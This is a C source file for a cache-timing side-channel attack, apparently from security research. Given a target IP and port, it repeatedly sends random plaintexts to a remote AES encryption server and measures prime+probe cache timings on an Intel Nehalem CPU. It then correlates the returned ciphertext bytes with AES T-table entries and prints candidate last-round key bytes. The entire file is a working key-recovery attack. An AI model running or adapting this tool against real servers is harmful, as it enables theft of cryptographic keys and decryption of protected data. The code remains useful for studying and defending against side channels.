#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include "ctattack.h"

#include <math.h>

#define RAM_ACCESS_TIME_EMPIRICAL 1000
#define REPS 100
#define CIPHERTEXTS 200000

int main(int argc, char* argv[])
{

    char *ip_str;
    int server_port;
    int socket_desc;
    struct sockaddr_in server;
    unsigned char message[16], server_reply[16];
    int times[REPS];
    FILE *fp;
    int i, j, m;
    int count = 0;
    int X[16][256], Y[16][256], K[16][256];


    nehalem_setup(0x38824d1a0);

    for (i = 0; i < REPS; ++i) {
        times[i] = 0;
    }

    for (i = 0; i < 256; ++i) {
        for (j = 0; j < 16; ++j) {
            X[j][i] = 0;
            K[j][i] = 0;
            Y[j][i] = 0;
        }
    }


    if ((argc != 3) && (argc != 4)) {
        printf("[!]Usage: %s IP PORT [OUTFILE default: data.csv]\n", argv[0]);
        return 1;
    }
    ip_str = argv[1];
    server_port = atoi(argv[2]);
    server.sin_addr.s_addr = inet_addr(ip_str);
    server.sin_family = AF_INET;
    server.sin_port = htons( server_port );





    unsigned long int min_prob_time;
    unsigned long int prob_time;
    int c = 0;


    for (count = 0; count < CIPHERTEXTS; ++count) {

        min_prob_time = 99999999;

        //message[0] = '\0';
        for (i = 0; i < 16; ++i) {
            message[i] = (unsigned char)rand()%256;
        }


        for (i = 0; i < REPS; ++i) {
            socket_desc = socket(AF_INET, SOCK_STREAM, 0);
            if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
            
            //Connect to remote server
            if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");

            nehalem_prime();
            nehalem_reprime();

            //message = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
            //message = "aaaabbbbccccdddd";
            if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
            if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }

            prob_time = nehalem_probe();

            if (min_prob_time > prob_time) {
                min_prob_time = prob_time;
            }

            close(socket_desc);

        }

        // if min probe time is less than a threshold increase counters for specific ciphertext
        for (i = 0; i < 16; ++i) {
            if (min_prob_time < 900) {
                c++;
                X[i][(unsigned int)server_reply[i]] += 1;
            }
            Y[i][(unsigned int)server_reply[i]] += 1;
        }
        







        // Realtime calculation
        if (count % 10000 == 0) {
            int TeN = 0;

            for (i = 0; i < 16; ++i) {
                for (j = 0; j < 256; ++j) {
                    K[i][j] = 0;
                }
            }

            for (m = 0; m < 16; ++m) {
                for (i = 0; i < 256; ++i) {
                    if (X[m][i] < 1) {
                        for (j = 0; j < 16; ++j) {
                            TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
                            //printf("i=%d\txor\tTe0=%d\t->\t%d\n", i, TeN, i^TeN);
                            K[m][i ^ TeN] += 1;
                        }
                    }
                    //printf("%x\n", get_TeN_idx(0, i));
                }
            }
            
            for (j = 0; j < 16; ++j) {
                printf("Byte %d: ", j);
                for (i = 0; i < 256; ++i) {
                    if (K[j][i] == 16) {
                        printf("0x%02x\t", i);
                    }
                }
                printf("\n");
            }
        }
        


/*
        printf("%d: %03d", count, server_reply[0]);
        for (i = 1; i < 16; ++i) {
            printf(":%03d", server_reply[i]);
        }
        printf("\t%lu\n", min_prob_time);
*/
    }



    int TeN = 0;

    for (i = 0; i < 16; ++i) {
        for (j = 0; j < 256; ++j) {
            K[i][j] = 0;
        }
    }

    for (m = 0; m < 16; ++m) {
        for (i = 0; i < 256; ++i) {
            if (X[m][i] < 1) {
                for (j = 0; j < 16; ++j) {
                    TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
                    //printf("i=%d\txor\tTe0=%d\t->\t%d\n", i, TeN, i^TeN);
                    K[m][i ^ TeN] += 1;
                }
            }
            //printf("%x\n", get_TeN_idx(0, i));
        }
    }
    

    for (j = 0; j < 16; ++j) {
        for (i = 0; i < 256; ++i) {
            printf("X[%d][%d]/Y[%d][%d]\t=\t%d/%d\t%f\t\t", j, i, j, i, X[j][i], Y[j][i], (float)X[j][i]/Y[j][i]);
            printf("K[%d][%d]=K[%d][0x%02x]\t=\t%d\n", j, i, j, i, K[j][i]);
        }
    }










for (j = 0; j < 16; ++j) {



// STATISTICS

    int Number = REPS;
    float Mean, Variance, SD, Sum=0, Differ, Varsum=0;
    int min=999999, max=0;
    int minarg=-1, maxarg=-1;


    for(i=0; i<Number; i++)
    {
        Sum = Sum + X[j][i];
    }


    for(i=0; i<256; i++)
    {
        if (K[j][i] < min) {
            min = K[j][i];
            minarg = i;
        }
        if (K[j][i] > max) {
            max = K[j][i];
            maxarg = i;
        }
    }

  
    Mean = Sum /(float)Number;
 
    for(i=0; i<Number; i++)
        {
        Differ = X[j][i] - Mean;
        Varsum = Varsum + pow(Differ,2);
    }
  
    Variance = Varsum / (float)Number;
    SD = sqrt(Variance);
  
    printf("Mean               = %.2f\n", Mean);
    printf("Varience           = %.2f\n", Variance);
    printf("Standard deviation = %.2f\n", SD);
    printf("Max K              = %d\n", max);
    printf("Maxarg K           = %d - %02x\n", maxarg, maxarg);
    printf("Min K              = %d\n", min);
    printf("Minarg K           = %d\n", minarg);

    printf("Miss Count         = %d\n", c);

}


/*
// EXPORTING


    char dir[256];

    if (argc == 3) {
        sprintf(dir, "%s", "data.csv");
    } else {
        sprintf(dir, "%s", argv[3]);
    }
    

    fp = fopen((const char*)dir, "w");

    for (i = 0; i < REPS; ++i) {
        fprintf(fp, "%d\n", X[i]);
    }

    fclose(fp);

*/


    return 0;
}









